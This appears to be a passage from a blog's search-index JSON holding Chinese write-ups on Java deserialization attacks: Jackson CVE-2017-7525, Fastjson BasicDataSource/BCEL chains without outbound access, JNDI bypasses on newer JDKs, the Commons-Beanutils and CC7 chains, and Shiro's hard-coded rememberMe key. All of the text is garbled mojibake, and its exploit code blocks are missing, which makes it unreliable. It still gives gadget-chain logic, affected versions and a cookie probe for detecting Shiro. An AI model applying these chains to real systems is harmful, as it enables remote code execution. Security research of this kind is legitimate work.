ä¸­å¯¹äºJacksonååºåˆ—åŒ–è°ƒç”¨setterã€getteræ–¹æ³•çš„æè¿°è¿‡äºå†—æ‚ä¸”ä¸æ¸…æ™°ï¼Œæ•…æƒ³ç”¨è‡ªå·±çš„è¯å’Œç†è§£é‡æ–°å†™ä¸€ä¸‹ã€‚ åœ¨com.fasterxml.jackson.databind.deser.BeanDeserializer#vanillaDeserializeä¸­ï¼Œä¼šæ ¹æ®å±æ€§ä»this._beanPropertieså¯»æ‰¾å¯¹åº”çš„è°ƒç”¨æ–¹æ³• è°ƒç”¨setter/getterï¼Œåœ¨com.fasterxml.jackson.databind.deser.BeanDeserializerFactory#addBeanPropsä¸­å¯ä»¥çœ‹åˆ°å¯¹åº”é€»è¾‘ (1) é¦–å…ˆçœ‹æ˜¯å¦æœ‰setteræ–¹æ³•ï¼Œè‹¥æœ‰åˆ™è°ƒç”¨setter (2) è‹¥æ²¡æœ‰setteræ–¹æ³•ï¼Œå…¶æ¬¡æŸ¥çœ‹æœ‰æ— è¿™ä¸ªå­æ®µ æ¡ä»¶ ç»“æœ å­—æ®µè®¿é—®å±æ€§ä¸ºpublicï¼Œæ— getteræ–¹æ³• æ ¹æ®å­—æ®µåå°„èµ‹å€¼ï¼Œæ­£å¸¸ååºåˆ—åŒ– å­—æ®µè®¿é—®å±æ€§ä¸ºprivateï¼Œæœ‰public getteræ–¹æ³• æ­£å¸¸ååºåˆ—åŒ– å­—æ®µè®¿é—®å±æ€§ä¸ºprivateï¼Œæ— getter&#x2F;æœ‰private getteræ–¹æ³• æ— æ³•æ­£å¸¸ååºåˆ—åŒ– (3) è‹¥setterå’Œå­—æ®µéƒ½æ²¡æœ‰ï¼Œæœ€åè°ƒç”¨public getteræ–¹æ³•ï¼Œå‰ææ˜¯getteræ–¹æ³•çš„è¿”å›å€¼å¿…é¡»æ˜¯Collectionã€Mapä»¥åŠå®ƒä»¬çš„å­—ç±» å…¶å®è¿™å°±é¡ºå¸¦è§£é‡Šäº†CVE-2017-7525 (åŸºäºTemplatesImplçš„Jacksonååºåˆ—åŒ–åˆ©ç”¨é“¾)ä¸ºä»€ä¹ˆèƒ½è§¦å‘getOutPropertiesæ–¹æ³•ï¼Œå› ä¸ºTemplatesImplç±»ä¸­æ—¢æ²¡æœ‰setOutPropertiesæ–¹æ³•ä¹Ÿæ²¡æœ‰outPropertieså­—æ®µï¼Œä¸”getOutPropertiesçš„è¿”å›å€¼Propertiesç±»æ˜¯Mapçš„å­—ç±»ã€‚ CVE-2017-7525 (TemplatesImplé“¾)å½±å“ç‰ˆæœ¬ Jackson 2.6ç³»åˆ— &lt; 2.6.7.1 Jackson 2.7ç³»åˆ— &lt; 2.7.9.1 Jackson 2.8ç³»åˆ— &lt; 2.8.8.1 JDK &lt; jdk7u80 EXP å¯ä»¥æ³¨æ„åˆ°ä¸Fastjson_Templatesåˆ©ç”¨é“¾çš„ä¸åŒç‚¹ï¼ŒJacksonä½¿ç”¨äº†transletBytecodeså’ŒtransletNameæ›¿æ¢äº†_bytecodeså’Œ_nameï¼Œå› ä¸ºjacksonååºåˆ—åŒ–éœ€è¦è°ƒç”¨å®ƒä»¬çš„setteræ–¹æ³•è¿›è¡Œèµ‹å€¼ JDKç‰ˆæœ¬é™åˆ¶ ä¸ºä»€ä¹ˆJDK7u13å¯ä»¥ï¼ŒJDK7u80ä¸è¡Œå‘¢ï¼ŒåŸå› æ˜¯å¯¹_tfactoryå‚æ•°çš„å¤„ç† åœ¨com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClassesä¸­ï¼ŒåŠ è½½æ¶æ„å­—èŠ‚ç ä¹‹å‰ä¼šèµ°è¿›ä¸€ä¸ªå…¶å®ƒçš„é€»è¾‘ å¯ä»¥çœ‹åˆ°JDK7u13ä¸­æ²¡æœ‰è°ƒç”¨_tafactoryï¼Œè€ŒJDK7u80è°ƒç”¨äº†_tfactory _tfactoryåœ¨TemplatesImplç±»ä¸­çš„é»˜è®¤å€¼ä¸ºnullï¼Œè°ƒç”¨nullçš„æ–¹æ³•ä¼šæŠ¥é”™ç©ºæŒ‡é’ˆå¼‚å¸¸ ä¸”_tfactoryå­—æ®µçš„è®¿é—®å±æ€§ä¸ºprivateï¼Œä¸”æ— setter/getteræ–¹æ³•ï¼Œå¯¼è‡´æ— æ³•åœ¨Jacksonååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è¢«èµ‹å€¼ ä¿®å¤ åœ¨com.fasterxml.jackson.databind.deser.BeanDeserializerFactoryå¼•å…¥é»‘åå• åœ¨åˆ›å»ºååºåˆ—åŒ–å™¨çš„æ—¶å€™ï¼Œè°ƒç”¨åˆ°com.fasterxml.jackson.databind.deser.BeanDeserializerFactory#createBeanDeserializeræ—¶ä¼šè°ƒç”¨checkIllegalTypesæ–¹æ³•ï¼Œè¿›è¡Œé»‘åå•æ£€æµ‹ æå–ç±»ååœ¨é»‘åå•ä¸­æ‰¾ï¼Œè‹¥åœ¨é»‘åå•ä¸­ç›´æ¥æŠ›å‡ºå¼‚å¸¸ "},{"title":"FastJsonååºåˆ—åŒ–ä¸å‡ºç½‘åˆ©ç”¨ä¸ä¸€äº›ç»†èŠ‚å®ç°","date":"2025-02-17T04:33:00.107Z","url":"/2025/02/17/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E4%B8%8E%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%8E%B0%E7%BB%86%E8%8A%82/","tags":[["FastJson","/tags/FastJson/"]],"categories":[["FastJson","/categories/FastJson/"]],"content":"ç»†èŠ‚çš„æ€è€ƒ1ã€é¦–å…ˆæ˜¯å…³äº parseå’Œ parseObjectï¼ŒäºŒè€…éƒ½å¯ä»¥å°† JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸º Javaå¯¹è±¡ï¼Œä¸åŒçš„ä»£ç å¯èƒ½ä¼šé‡‡ç”¨ä¸åŒçš„ååºåˆ—åŒ–æ–¹æ³•ã€‚ åŠ å…¥è¦ååºåˆ—åŒ–çš„ jsonStringå¦‚ä¸‹æ‰€ç¤ºï¼š ä¸‰ç§ååºåˆ—åŒ–æ–¹å¼å¯¹åº”ä¸‰ç§ä¸åŒçš„ç»“æœï¼š (1) JSON.parse(jsonString) å½“JSONå­—ç¬¦ä¸²åŒ…å«@typeå±æ€§æ—¶ï¼ŒFastJSONä¼šå°è¯•å®ä¾‹åŒ–æŒ‡å®šç±»ã€‚ è°ƒç”¨é¡ºåºï¼š è°ƒç”¨æ— å‚æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡å®ä¾‹ã€‚ è°ƒç”¨setteræ–¹æ³•ï¼šæ ¹æ®JSONé”®ååŒ¹é…ç›®æ ‡ç±»çš„ setter()æ–¹æ³•ï¼ˆè‹¥å­˜åœ¨ï¼‰ã€‚ ç›´æ¥èµ‹å€¼å­—æ®µï¼šè‹¥æ²¡æœ‰setteræ–¹æ³•ï¼Œåˆ™ç›´æ¥é€šè¿‡åå°„ä¿®æ”¹å­—æ®µï¼ˆéœ€å­—æ®µä¸º publicæˆ–å¯ç”¨Feature.SupportNonPublicFieldï¼‰ã€‚ è§¦å‘getteræ–¹æ³•ï¼šè°ƒç”¨æŸäº›ç‰¹æ®Šçš„ç¬¦åˆæ¡ä»¶çš„ getter()ï¼Œå¦‚æœJSONä¸­å­˜åœ¨æŸäº›ç‰¹æ®Šé€»è¾‘ï¼ˆå¦‚ JSONObjectåµŒå¥—ï¼‰ï¼Œå¯èƒ½åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ„å¤–è§¦å‘ getter()ã€‚ (2) JSON.parseObject(jsonString) åŒ…å« @typeæ—¶ä¸ parse()è¡Œä¸ºä¸€è‡´ï¼Œä¼šå®ä¾‹åŒ–æŒ‡å®šç±»å¹¶è°ƒç”¨setter&#x2F;å­—æ®µã€‚ é¢å¤–è°ƒç”¨ getterï¼š ç”±äºparseObject()ä¼šå°è¯•å°†ç»“æœè½¬ä¸º JSONObjectï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ç›®æ ‡å¯¹è±¡çš„æ‰€æœ‰ getteræ–¹æ³•ä»¥è·å–å±æ€§å€¼ã€‚ è¿™ä¼šå¯¼è‡´ getteræ–¹æ³•ä¸­çš„é€»è¾‘è¢«è§¦å‘ (å³ä½¿JSONä¸­æœªæ˜¾å¼åŒ…å«å¯¹åº”é”®)ã€‚ (3) JSON.parseObject(jsonString, Target.class) ç›´æ¥è§£æ JSONå­—ç¬¦ä¸²åˆ°æŒ‡å®šç±» Target.classï¼Œå¿½ç•¥ @typeå±ã€‚ åç»­é€»è¾‘ä¸ JSON.parse()ç›¸ä¼¼ï¼Œåªä¸è¿‡æ˜¯åœ¨ Target.classä¸­è¿›è¡Œè°ƒç”¨ç½¢äº†ï¼Œè‹¥ Target.classæ— å±é™©é€»è¾‘ï¼Œåˆ™ä¸ä¼šå‡ºç°å®‰å…¨æ¼æ´ã€‚ parseè°ƒç”¨ getter()ç»•è¿‡Fastjson &lt;&#x3D; 1.2.36ååºåˆ—åŒ–æ—¶é¦–å…ˆå¾—åˆ°ä¸€ä¸ªJSONObjectå¯¹è±¡ï¼Œç„¶åå°†è¯¥JSONObjectå¯¹è±¡ç½®äºâ€JSON Keyâ€çš„ä½ç½®ã€‚Fastjsonåœ¨ååºåˆ—åŒ–æ—¶ä¼šå¯¹â€JSON Keyâ€è‡ªåŠ¨è°ƒç”¨JSON.toString()ã€‚JSONObjectæ˜¯Mapçš„å­ç±»ï¼Œæ‰§è¡ŒtoString()æ—¶ä¼šå°†å½“å‰å¯¹è±¡è½¬ä¸ºå­—ç¬¦ä¸²å½¢å¼ï¼Œä¼šæå–ç±»ä¸­æ‰€æœ‰Fieldï¼Œè‡ªç„¶ä¼šæ‰§è¡Œç›¸åº”çš„getterã€isç­‰æ–¹æ³• â€“ Kingxå¸ˆå‚…çš„è§£é‡Šï¼Œåœ¨è¿™é‡Œç›´æ¥å¼•ç”¨äº†ã€‚ ä¸ºä»€ä¹ˆ Fastjson &gt; 1.2.36ä¸èƒ½åˆ©ç”¨è¿™ç§ç»•è¿‡è°ƒç”¨ getteräº† ï¼ˆå‚è€ƒ jlklå¸ˆå‚…ï¼‰ Fastjson &gt;&#x3D; 1.2.36 Fastjsonä¸å‡ºç½‘åˆ©ç”¨TemplatesImpleé“¾TemplatesImplé“¾åœ¨ä¹‹å‰æåˆ°è¿‡ï¼Œåˆ©ç”¨å­—èŠ‚ç åŠ è½½æ¶æ„ç±»RCEï¼Œç”±äº privateå±æ€§çš„é™åˆ¶éœ€è¦å¼€å¯ Feature.SupportNonPublicFieldï¼Œå¾ˆé¸¡è‚‹ã€‚ BasicDataSourceé“¾ä¾èµ–ï¼šTomcatæ•°æ®åº“é©±åŠ¨ç»„ä»¶ tomcat-dbcp è°ƒç”¨é“¾ - org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection() â€“&gt; createDataSource() â€“&gt; createConnectionFactory() å…ˆç»™å‡º EXP JSON.parse(jsonString) Fastjson &lt;&#x3D; 1.2.36 JSON.parse(jsonString) Fastjson &gt;&#x3D; 1.2.36 JSON.parseObject(jsonString) é¦–å…ˆé€šè¿‡è§¦å‘ getConnection()æ–¹æ³•è°ƒç”¨ createDataSource()æ–¹æ³• createDataSource()æ–¹æ³•è°ƒç”¨ createConnectionFactory()æ–¹æ³• createConnectionFactory()æ–¹æ³•è°ƒç”¨ DriverFactory.createDriver()æ–¹æ³• è·Ÿè¿›ï¼Œæ¥åˆ° sinkç‚¹Class.forName(driverClassName, true, driverClassLoader); æ ¹æ® Pç¥ã€ŠJavaå®‰å…¨æ¼«è°ˆã€‹ç¬¬ä¸€ç¯‡æ–‡ç« çš„å†…å®¹å¯çŸ¥ï¼Œå½“ä½¿ç”¨ Class.forName()æ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•° initialä¸º trueæ—¶ï¼Œç±»åŠ è½½åå°†ä¼šç›´æ¥æ‰§è¡Œ static{}é™æ€ä»£ç å—ä¸­çš„ä»£ç  å…¶ä¸­ driverClassLoaderå’Œ driverClassNameå¯æ§ (è°ƒç”¨ setter)ï¼Œæ¥ä¸‹æ¥å¯»æ‰¾ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„æ¶æ„ç±»å³å¯ éœ€è¦é¢å¤–å…³æ³¨çš„æ˜¯ driverClassLoaderï¼Œå³ expä¸­çš„ com.sun.org.apache.bcel.internal.util.ClassLoader å¦‚æœ class_nameä»¥ $$BCEL$$å¼€å¤´ï¼Œåˆ™å– $$BCEL$$ä¹‹åçš„éƒ¨åˆ†è§£ç åä½œä¸º classçš„å­—èŠ‚ç ï¼Œå¹¶è°ƒç”¨ defineClassè·å– classå¯¹è±¡ã€‚ è¿™æ¡é“¾å­åˆ°è¿™é‡Œå°±é½äº†ï¼Œåœ¨æ¶æ„ç±»é™æ€ä»£ç å—ä¸­å†™æ¶æ„ä»£ç ï¼Œæ„é€  $$BCEL$$æ¶æ„å­—èŠ‚ç é€šè¿‡ fastjsonèµ‹å€¼ç»™ driverClassNameï¼Œå¹¶å°†ç±»åŠ è½½å™¨ com.sun.org.apache.bcel.internal.util.ClassLoaderèµ‹å€¼ç»™driverClassLoaderï¼Œå°±å¯ä»¥åœ¨ä¸å‡ºç½‘åè¿çš„æ¡ä»¶ä¸‹æ‰§è¡Œæ¶æ„ä»£ç äº†ã€‚ ç‰ˆæœ¬çš„å±€é™æ€§1ã€ç»¿ç›Ÿå®˜æ–¹å¯¹äº BasicDataSourceé“¾åœ¨ Fastjsonå„ç‰ˆæœ¬çš„åˆ©ç”¨è¿›è¡Œäº†æµ‹è¯•  BasicDataSourceé“¾ä¸å‡ºç½‘åˆ©ç”¨åªé€‚ç”¨äº Fastjson &lt;&#x3D; 1.2.24ï¼Œå› ä¸ºä» Fastjson &gt;&#x3D; 1.2.25å¼€å§‹ï¼ŒcheckAutoTypeä¸­å¯¹ BasicDataSourceè¿›è¡Œäº†å•ç‹¬çš„æ£€æµ‹ï¼Œæ— æ³•ç»•è¿‡ L â€¦ ; åªèƒ½å¸®åŠ©ç»•è¿‡é»‘åå•é™åˆ¶ 2ã€BasicDataSourceç±»åœ¨ä¸åŒç‰ˆæœ¬çš„ tomcat-dbcpåŒ…ä¸­æœ‰ä¸åŒçš„ä½ç½®ï¼Œå‚è€ƒ KINGXå¸ˆå‚…çš„ blog å‚è€ƒæ–‡ç«  â€“ Pç¥å¯¹äº $$BCEL$$çš„è§£é‡Š  â€“ KINGX  â€“ ç»¿ç›Ÿ  â€“ Y4tacker, $refè°ƒç”¨ getter  â€“ KINGX, FastJsonååºåˆ—åŒ–æ¼æ´åˆ©ç”¨çš„ä¸‰ä¸ªç»†èŠ‚ "},{"title":"jndiæ³¨å…¥é«˜ç‰ˆæœ¬JDKç»•è¿‡","date":"2025-02-13T01:00:20.948Z","url":"/2025/02/13/jndi%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%87/","tags":[["jndiæ³¨å…¥","/tags/jndi%E6%B3%A8%E5%85%A5/"]],"categories":[["jndiæ³¨å…¥","/categories/jndi%E6%B3%A8%E5%85%A5/"]],"content":"å‰è¨€jndiæ³¨å…¥æœ¬è´¨æ˜¯ lookup()æ–¹æ³•å‚æ•°å€¼å¯æ§ï¼Œattackerå¯ä»¥é€šè¿‡ä½¿å…¶åŠ è½½æ¶æ„ rmi&#x2F;ldapæœåŠ¡é€ æˆå‘½ä»¤æ‰§è¡Œã€‚ Oracle openJDK8u121ä¹‹ååœ¨ loadClassæ–¹æ³•ä¸­å¼•å…¥ trustURLCodeBaseæ¥é™åˆ¶ rmiå¯¹äº codebaseçš„è¿œç¨‹åŠ è½½ï¼Œä½†æ˜¯å¿˜è®°è€ƒè™‘äº† ldapçš„åˆ©ç”¨ï¼Œæ‰€ä»¥ 8u121 - 8u191ä¹‹é—´çš„ç»•è¿‡æ–¹æ³•æ˜¯åˆ©ç”¨ ldapç»•è¿‡ã€‚ Oracle openJDK8u191ä¹‹åå®˜æ–¹ä¿®å¤äº† ldapçš„åˆ©ç”¨ï¼Œä¿®å¤åŸç†åŒä¸Šï¼Œæ— æ³•è¿›è¡Œè¿œç¨‹åŠ è½½ç±»å®ä¾‹åŒ–&#x2F;æ‰§è¡Œé™æ€ä»£ç å—ä»£ç ã€‚ æ‰€ä»¥æ€è€ƒå¦‚ä½•äº†åˆ©ç”¨æœ¬åœ°å·²æœ‰ç±»è¿›è¡Œç»•è¿‡ã€‚ JDK&gt;&#x3D;8u191ç»•è¿‡é™¤äº† trustURLCodebaseå¤–ï¼Œcom.sun.jndi.rmi.registry.RegistryContext#decodeObject ä¸­é™åˆ¶äº† FactoryClassLocationå¿…é¡»ä¸º nullï¼Œå¦åˆ™æŠ›å‡ºå¼‚å¸¸ æ‰€ä»¥ç¬¬ä¸€æ¬¡ç»•è¿‡å°±æ˜¯ factoryLocationä¸º null ç¬¬äºŒä¸ªç»•è¿‡ç‚¹å°±æ˜¯ javax.naming.spi.NamingManager#getObjectFactoryFromReference å¯ä»¥å°è¯•åŠ è½½æœ¬åœ°ç±»ï¼Œä½¿ç”¨åŠ è½½çš„æœ¬åœ°ç±»å¯¹è±¡è°ƒç”¨ factory.getObjectInstanceæ–¹æ³•å®ç°å‘½ä»¤æ‰§è¡Œ å› ä¸ºè¿”å›å¯¹è±¡æ˜¯ ObjectFactoryç±»å‹ï¼Œæ‰€ä»¥åŠ è½½çš„æœ¬åœ°ç±»å¿…é¡»å®ç° ObjectFactoryæ¥å£ æ°å·§ tomcatä¸­çš„ä¸€ä¸ªç±» org.apache.naming.factory.BeanFactory ç±»ä¸ä»…å®ç°äº† ObjectFactoryæ¥å£ï¼Œå¹¶ä¸” org.apache.naming.factory.BeanFactory#getObjectInstance ä¸­è°ƒç”¨äº† method.invokeæ–¹æ³•ï¼Œç»™äº†å‘½ä»¤æ‰§è¡Œå¯ä¹˜ä¹‹æœº EXPæ„é€ (1) javax.el.ELProcessorï¼Œéœ€è¦ tomcatä¾èµ– (2) ä½¿ç”¨ groovyï¼Œéœ€è¦ groovyä¾èµ– å‚è€ƒ  "},{"title":"Commons-Beanutilsé“¾ååºåˆ—åŒ–åˆ†æ","date":"2025-02-11T01:48:15.038Z","url":"/2025/02/11/CB%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Shiro","/tags/Shiro/"]],"categories":[["Shiro","/categories/Shiro/"]],"content":"Shiroä¸­ä¸è‡ªå¸¦ Commons-Collectionsä¾èµ–ï¼Œä½†æ˜¯è‡ªå¸¦ Commons-Beanutilsä¾èµ–ï¼Œæ•…å¯ä»¥å°è¯•ä½¿ç”¨ CBé“¾æ‰“ Shiroååºåˆ—åŒ–æ¼æ´ã€‚ Commons-beanutilsCommons-Beanutils æ˜¯ Apache è½¯ä»¶åŸºé‡‘ä¼šæä¾›çš„ä¸€ä¸ªå¼€æº Java åº“ï¼Œæ—¨åœ¨ç®€åŒ– Java Bean å¯¹è±¡çš„æ“ä½œã€‚å®ƒæä¾›äº†ä¾¿æ·çš„å·¥å…·æ¥è®¿é—®å’Œä¿®æ”¹ Java Bean çš„å±æ€§ï¼Œå°¤å…¶æ˜¯åœ¨åŠ¨æ€æˆ–å¤æ‚çš„å±æ€§æ“ä½œæ—¶ï¼Œå®ƒä½¿å¾—ä»£ç æ›´åŠ ç®€æ´å’Œé«˜æ•ˆã€‚ Userç±»ï¼Œä¸€ä¸ªæ™®é€šçš„ JavaBeanï¼š æ­£å¸¸è°ƒç”¨ JavaBeanï¼š ä½¿ç”¨ commons-beanutilsè°ƒç”¨ JavaBeanï¼š åˆ†æ TemplatesImplæ—¶ï¼Œç±»ä¸­æœ‰ä¸ª getteræ–¹æ³• - getOutputPropertiesä¹Ÿè°ƒç”¨äº† TemplatesImpl.newTransformerï¼š å¯ä»¥åœ¨ Shiroä¸­æ‰¾å“ªé‡Œè°ƒç”¨äº† PropertyUtils.getPropertyï¼Œæ„é€  expã€‚ å®Œæ•´ EXP EXPæ„é€ é€»è¾‘1ã€é¦–å…ˆå·²ç»ç¡®è®¤äº† PropertyUtils.getProperty(templates, â€œoutputPropertiesâ€); å®ç°å‘½ä»¤æ‰§è¡Œçš„ç›®æ ‡ï¼ŒæŸ¥æ‰¾ getPropertyUtilsè°ƒç”¨ä½ç½®ï¼Œå…¶åœ¨ BeanComparatorä¸­å¯æ§ï¼Œpropertyåœ¨æ„é€ å‡½æ•°ä¸­è¢«èµ‹å€¼ï¼š 2ã€æŸ¥æ‰¾ compareçš„ç”¨æ³•ï¼Œå¯ä»¥ç»“åˆ CC4é“¾çš„æ€è·¯ï¼Œjava.utilå·¥å…·ç±»ä¸­çš„ PriorityQueueç±»ä¸­çš„ readObjectæ–¹æ³•è°ƒç”¨äº† compareï¼Œæ­£å¥½ç¬¦åˆååºåˆ—åŒ–æ¡ä»¶ï¼š comparatorå¯ä»¥åœ¨æ„é€ å‡½æ•°ä¸­èµ‹å€¼å¯æ§ï¼š EXPæ„é€ å‘ç‚¹ï¼š1ã€å‘é˜Ÿåˆ—ä¸­ç¬¬äºŒæ¬¡æ·»åŠ æ•°æ® - priorityQueue.add(1)æ—¶ï¼Œæå‰è§¦å‘ comparator.compareæ–¹æ³•ï¼Œåˆ°è¾¾ä¸‹å›¾æ–­ç‚¹ä½ç½®ï¼Œè¦åœ¨ Integerç±»ä¸­æŸ¥æ‰¾è°ƒç”¨ getOutputPropertiesæ–¹æ³•ï¼Œä½†æ˜¯ Integerç±»ä¸­æ²¡æœ‰è¿™ä¸ª getteræ–¹æ³•ï¼Œä»è€Œäº§ç”ŸæŠ¥é”™ï¼š å¯ä»¥åˆ©ç”¨ TransformingComparatorç±»ä¸­çš„ compareæ–¹æ³•ï¼Œç»“åˆ new ConstantTransformer(1)è¿”å›å¸¸é‡ï¼Œtransformeråœ¨æ„é€ å‡½æ•°ä¸­èµ‹å€¼å¯æ§ï¼Œè™½ç„¶ TransformingCoparatoræ˜¯ commons-collectionsä¸­çš„ç±»ï¼Œä½†æ˜¯åªæ˜¯ä¸ºäº† priorityQueue.add(1)æå‰å‘½ä»¤æ‰§è¡Œå¯¼è‡´åç»­ä»£ç æ— æ³•æ­£å¸¸æ‰§è¡Œï¼Œä¸å½±å“æœ€ç»ˆçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç»“æœï¼š å…·ä½“å®ç°ä»£ç ï¼š 2ã€å®Œå…¨åŸç”Ÿæ‰“ Shiroæ—¶ï¼Œåªæœ‰ commons-beanutilsæ²¡æœ‰ commons-collectionsï¼Œä½†æ˜¯ BeanComparatorå•å‚æ„é€ å‡½æ•°ä¸­ä½¿ç”¨äº† CCä¸­çš„ç±»ï¼Œä¼šå¯¼è‡´æŠ¥é”™ - æ‰¾ä¸åˆ°è¿™ä¸ªç±»ï¼š å¯ä»¥ä½¿ç”¨å®ƒçš„å¦ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œæ‰‹åŠ¨èµ‹å€¼ comparator å‰ææ˜¯å®ç°äº† Serializableæ¥å£(å¯ä»¥è¢«ååºåˆ—åŒ–)ï¼Œå¹¶ä¸”ä¾èµ–ä¸­å­˜åœ¨ï¼ŒAttrCompareç±»å°±ç¬¦åˆæ¡ä»¶ï¼Œæ„é€ å³å¯ï¼š cbé“¾æ‰“ Shiroååºåˆ—åŒ–æ¼æ´å¤ç°ï¼š "},{"title":"Shiroç¡¬ç¼–ç ååºåˆ—åŒ–","date":"2025-02-10T03:00:44.732Z","url":"/2025/02/10/shiro%20%E7%A1%AC%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","tags":[["Shiro","/tags/Shiro/"]],"categories":[["Shiro","/categories/Shiro/"]],"content":"ç¯å¢ƒæ­å»ºApache-Shiro 1.2.4:  å‚è€ƒ Y4er:  (Windows) Shiro -1.2.4 - sample - web environment for Macï¼š 1ã€é¦–å…ˆç¡®è®¤ ~&#x2F;.m2&#x2F;toolchains.xmlå­˜åœ¨ - ls -l ~/.m2/toolchains.xmlï¼š ä¸å­˜åœ¨åˆ™ touch ~/.m2/toolchains.xmlï¼Œå­˜åœ¨åˆ™ nano ~/.m2/toolchains.xmlç¼–è¾‘å³å¯ã€‚ 2ã€~&#x2F;.m2&#x2F;toolchains.xml ï¼ˆç‰ˆæœ¬å’Œ jdkä¿¡æ¯å’Œ pom.xmlä¸€è‡´å³å¯ï¼‰: 3ã€æ ¹ç›®å½• mvn clean packageæ„å»ºå·¥ä»¶ waråŒ…ï¼ŒTomcatéƒ¨ç½²å¯åŠ¨ï¼š æ¼æ´åˆ†æåŠ è§£å¯†æµç¨‹ 1ã€CookieRememberMeManager.getRememberedSerializedIdentityä» Cookieä¸­è¯»æ•°æ®å¹¶ä½¿ç”¨ Base64è§£å¯†ï¼š 2ã€æŸ¥æ‰¾ CookieRememberMeManager.getRememberedSerializedIdentityç”¨æ³•ï¼Œåœ¨AbstractRememberMeManager.getRememberedPrincipalsè¢«è°ƒç”¨ï¼Œå‘ä¸‹è·Ÿè¿› convertBytesToPrincipalsï¼š AESè§£å¯†åè¿›è¡Œååºåˆ—åŒ–ï¼Œè·Ÿè¿› decryptï¼š ä½¿ç”¨ getDecryptionCipherKey()è·å– AES_KEYï¼š å‘ä¸Šè·Ÿè¿›æœ€åå¯çŸ¥ AES_KEYä¸ºç¡¬ç¼–ç å¯†é’¥ï¼Œå¯ä»¥è¿›è¡Œæ•°æ®ä¼ªé€ ï¼š åŠ å¯†exppython Javaå‚è€ƒ ShiroAttack2 - Encrypt.java  æ¼æ´åˆ©ç”¨1ã€ç‰¹å¾åˆ¤æ–­ï¼šè¯·æ±‚åŒ… Cookieæ„é€  rememberMe&#x3D;123; -&gt; å“åº” rememberMe&#x3D;deleteMe è‡ªåŠ¨åŒ–åˆ©ç”¨å·¥å…· ShiroAttack2 ()"},{"title":"Commons-Collections-CC7é“¾åˆ†æ","date":"2025-02-09T05:47:59.914Z","url":"/2025/02/09/CC7%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"CC7é“¾è¾ƒä¹‹å‰åˆ†æçš„è°ƒç”¨é“¾ç›¸æ¯”æ›´åŠ å¤æ‚ï¼Œæ„é€  expçš„å‘ç‚¹ä¹Ÿæ›´å¤šã€‚ å®Œæ•´ EXP EXPæ„é€ é€»è¾‘å¯ä»¥å‚è€ƒ ysoserialä¸­çš„ CommonsCollections7.java () 1ã€LazyMap.getæ–¹æ³•å¯ä»¥åœ¨ AbstractMap.equalsä¸­è¢«è°ƒç”¨ï¼š 2ã€AbstractMap.equalså¯ä»¥åœ¨ AbstractMapDecorator.equalsä¸­è¢«è°ƒç”¨ï¼š 3ã€AbstractMapDecorator.equalså¯ä»¥åœ¨ Hashtable.reconstitutionPutä¸­è¢«è°ƒç”¨ï¼š 4ã€Hashtable.reconstitutionPutåœ¨ Hashtable.readObjectä¸­è¢«è°ƒç”¨ï¼š EXPæ„é€ å‘ç‚¹1ã€hashtable.put(lazyMap2, 2)æå‰è§¦å‘ equalså¯¼è‡´æå‰å‘½ä»¤æ‰§è¡Œï¼š åˆ©ç”¨å‰å‡ æ¡é“¾çš„æ€è·¯ï¼Œå…ˆç»™ lazyMap2çš„ factoryå±æ€§ä½¿ç”¨ new ConstantTransformerèµ‹å€¼ï¼Œhash table.put(lazyMap2,2)ä¹‹åå†åˆ©ç”¨åå°„ä¿®æ”¹ä¼š chainedTransformerï¼š 2ã€hashtable.put(lazyMap2,2)æ—¶ï¼Œç»è¿‡ LazyMap.getæ–¹æ³•æ—¶ä¼šå°† lazyMap1ä¸­çš„é”® â€œyyâ€æ·»åŠ åˆ° lazyMap2ä¸­ï¼Œå¯¼è‡´ååºåˆ—åŒ–æ—¶ä¸æ‰§è¡Œ transformï¼Œå¯¼è‡´ä¸èƒ½å‘½ä»¤æ‰§è¡Œï¼š æ‰€ä»¥éœ€è¦åœ¨ hashtable.put(lazyMap2,2)ä¹‹ååˆ é™¤ lazyMap2ä¸­çš„ â€œyyâ€é”®ï¼š 3ã€new ConstantTransformer(?) ä¸­ ?çš„å€¼ä¸èƒ½å’Œ hash table.put(lazyMap2, value)ä¸­çš„ valueå€¼ç›¸åŒï¼Œå¦åˆ™ä¸ä¼šè§¦å‘ hashtable.put(lazyMap2, value)ä¸­çš„ addEntryæ–¹æ³•ï¼Œå¯¼è‡´åç»­ä»£ç æ— æ³•æ­£å¸¸æ‰§è¡Œï¼š æ‰“æ–­ç‚¹è·Ÿè¿› hashtable.put(lazyMap2, value)çš„é€»è¾‘ä¸­ï¼Œè·Ÿè¿› entry.key.equals(key)ï¼Œåœ¨ AbstractMap.equalsæ–¹æ³•ä¸­è¿›è¡Œäº†åˆ¤æ–­ï¼Œè‹¥è¿™ä¸¤ä¸ªå€¼ç›¸åŒï¼Œåˆ™ä¼šè¿”å› trueï¼š åæœå°±æ˜¯åœ¨ hashtable.putä¸­ï¼Œç›´æ¥è¿›å…¥åˆ° ifé€»è¾‘ä¸­ï¼Œreturn oldè€Œä¸æ˜¯æ‰§è¡Œ addEntryæ–¹æ³•ï¼Œå¯¼è‡´åç»­ä»£ç æ— æ³•æ­£å¸¸æ‰§è¡Œï¼š 4ã€lazyMap1å’Œ lazyMap2è®¡ç®—åçš„ hashå€¼éœ€è¦ç›¸åŒï¼Œå› ä¸ºä½¿ç”¨äº† &amp;&amp;ï¼Œè‹¥å·¦ä¾§è¯­å¥ä¸º 